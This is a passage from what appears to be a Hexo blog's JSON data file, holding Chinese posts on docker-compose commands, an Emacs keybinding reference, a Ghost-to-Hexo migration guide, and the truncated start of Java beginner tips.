SIGINT</code>：给服务发送特定的信号。<br><br><code>logs</code>：输出日志<br><br><code>port</code>：输出绑定的端口<br><br><code>ps</code>：输出运行的容器<br><br><code>pull</code>：pull服务的image<br><br><code>rm</code>：删除停止的容器<br><br><code>run</code>: 运行某个服务，例如docker-compose run web python manage.py shell<br><br><code>start</code>：运行某个服务中存在的容器。<br><br><code>stop</code>:停止某个服务中存在的容器。<br><br><code>up</code>：create + run + attach容器到服务。<br><br><code>scale</code>：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3<br><br>参考:<br><br><a href=\"http://docs.docker.com/compose/\">Compose Document</a></p><br>                        <div class=\"clear\"></div><br>                                            </div>\n\n<blockquote>\n<p>转载:<a href=\"http://debugo.com/docker-compose\">http://debugo.com/docker-compose</a></p>\n</blockquote>\n"},{"title":"Emacs 命令大全","id":"5","updated":"2016-08-05T20:14:03.000Z","date":"2016-07-29T01:10:07.000Z","_content":"\n\n**emacs命令**是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n<!-- more --> \n## # 语法\n\nemacs(选项)(参数)\n\n## #选项\n\n<pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n## #参数\n\t文件：指定要编辑的文本文件。\n\n## #emacs命令操作大全\n\n基本命令\n\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n编辑\n\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n移动光标\n\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\nBuffer 相关\n\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n拷贝与粘贴\n\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n搜索和替换\n\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\nTags\n\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n书签\n\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n帮助\n\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n其它\n\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","source":"_posts/Emacs-命令大全.md","raw":"---\ntitle: Emacs 命令大全\ntags: 'Linux'\npermalink: emacs-da-quan\nid: 5\nupdated: '2016-08-05 21:14:03'\ndate: 2016-07-29 02:10:07\n---\n\n\n**emacs命令**是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n<!-- more --> \n## # 语法\n\nemacs(选项)(参数)\n\n## #选项\n\n<pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n## #参数\n\t文件：指定要编辑的文本文件。\n\n## #emacs命令操作大全\n\n基本命令\n\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n编辑\n\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n移动光标\n\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\nBuffer 相关\n\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n拷贝与粘贴\n\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n搜索和替换\n\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\nTags\n\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n书签\n\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n帮助\n\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n其它\n\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","slug":"emacs-da-quan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk9000043son0dw79g4p","content":"<p><strong>emacs命令</strong>是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。<br><a id=\"more\"></a> </p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"# 语法\"></a># 语法</h2><p>emacs(选项)(参数)</p>\n<h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"#选项\"></a>#选项</h2><pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</span></pre>\n\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"#参数\"></a>#参数</h2><pre><code>文件：指定要编辑的文本文件。\n</code></pre><h2 id=\"emacs命令操作大全\"><a href=\"#emacs命令操作大全\" class=\"headerlink\" title=\"#emacs命令操作大全\"></a>#emacs命令操作大全</h2><p>基本命令</p>\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n<p>编辑</p>\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n<p>移动光标</p>\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\n<p>Buffer 相关</p>\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n<p>拷贝与粘贴</p>\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n<p>搜索和替换</p>\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\n<p>Tags</p>\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n<p>书签</p>\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n<p>帮助</p>\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n<p>其它</p>\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","excerpt":"<p><strong>emacs命令</strong>是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。<br>","more":"</p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"# 语法\"></a># 语法</h2><p>emacs(选项)(参数)</p>\n<h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"#选项\"></a>#选项</h2><pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"#参数\"></a>#参数</h2><pre><code>文件：指定要编辑的文本文件。\n</code></pre><h2 id=\"emacs命令操作大全\"><a href=\"#emacs命令操作大全\" class=\"headerlink\" title=\"#emacs命令操作大全\"></a>#emacs命令操作大全</h2><p>基本命令</p>\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n<p>编辑</p>\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n<p>移动光标</p>\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\n<p>Buffer 相关</p>\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n<p>拷贝与粘贴</p>\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n<p>搜索和替换</p>\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\n<p>Tags</p>\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n<p>书签</p>\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n<p>帮助</p>\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n<p>其它</p>\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>"},{"title":"GHOST搬迁到HEXO(Github Pages)指南","date":"2016-09-12T20:41:59.000Z","_content":"# 前言\n\n想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n# 前提\n在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n* 安装HEXO\n* 配置Github\n\n# 搬家\n## 第一步\nGhost导出数据json：实验室-导出，下载好json\n\n## 第二步\n安装搬家工具\n```\nnpm i hexo-migrator-ghost --save  \n```\n## 第三步\n\n修改`./scaffolds/post.md`文件内容为：\n\n```\ntitle: {{ title }}  \ndate: {{ date }}  \ntags: {{ tags }}  \n---\n```\n## 第四步\n将json文件放到根目录，并且执行：\n\n```\nhexo migrate ghost source.json  \nhexo clean ; hexo d -g \n```\n\n# 注意\n经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n* HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\n* tag可能会出问题，会自动加--，请自行删除，或者批量删除","source":"_posts/GHOST搬迁到HEXO-Github-Pages-指南.md","raw":"---\ntitle: GHOST搬迁到HEXO(Github Pages)指南\ndate: 2016-09-12 21:41:59\ntags: Web\ncategories: Web\n---\n# 前言\n\n想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n# 前提\n在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n* 安装HEXO\n* 配置Github\n\n# 搬家\n## 第一步\nGhost导出数据json：实验室-导出，下载好json\n\n## 第二步\n安装搬家工具\n```\nnpm i hexo-migrator-ghost --save  \n```\n## 第三步\n\n修改`./scaffolds/post.md`文件内容为：\n\n```\ntitle: {{ title }}  \ndate: {{ date }}  \ntags: {{ tags }}  \n---\n```\n## 第四步\n将json文件放到根目录，并且执行：\n\n```\nhexo migrate ghost source.json  \nhexo clean ; hexo d -g \n```\n\n# 注意\n经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n* HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\n* tag可能会出问题，会自动加--，请自行删除，或者批量删除","slug":"GHOST搬迁到HEXO-Github-Pages-指南","published":1,"updated":"2016-09-12T13:57:43.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk9d00083son1auam8uv","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>\n<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>\n<ul>\n<li>安装HEXO</li>\n<li>配置Github</li>\n</ul>\n<h1 id=\"搬家\"><a href=\"#搬家\" class=\"headerlink\" title=\"搬家\"></a>搬家</h1><h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>安装搬家工具<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">title: &#123;&#123; title &#125;&#125;  </div><div class=\"line\">date: &#123;&#123; date &#125;&#125;  </div><div class=\"line\">tags: &#123;&#123; tags &#125;&#125;  </div><div class=\"line\">---</div></pre></td></tr></table></figure>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo migrate ghost source.json  </div><div class=\"line\">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>\n<ul>\n<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>\n<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>\n<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>\n<ul>\n<li>安装HEXO</li>\n<li>配置Github</li>\n</ul>\n<h1 id=\"搬家\"><a href=\"#搬家\" class=\"headerlink\" title=\"搬家\"></a>搬家</h1><h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>安装搬家工具<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">title: &#123;&#123; title &#125;&#125;  </div><div class=\"line\">date: &#123;&#123; date &#125;&#125;  </div><div class=\"line\">tags: &#123;&#123; tags &#125;&#125;  </div><div class=\"line\">---</div></pre></td></tr></table></figure>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo migrate ghost source.json  </div><div class=\"line\">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>\n<ul>\n<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>\n<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>\n</ul>\n"},{"title":"Java初学者小经验","date":"2016-09-30T11:47:27.000Z","_content":"# Java初学者小技巧\n我是个Java新手，总结了一些经验\n\n## 构造器和方法的区别\n<table><tbody><tr></tr><tr><th><font>主题</font></th><th><font>构造器</font></th><th><font>方法</font></th></tr><tr><td><font>功能</font></td><td><font>建立一个类的实例</font></td><td><font>java功能语句</font></td></tr><tr><td><font>修饰</font></td><td><font>不能用<code>bstract</code>, <code>final</code>, <code>native</code>, <code>static</code>, or 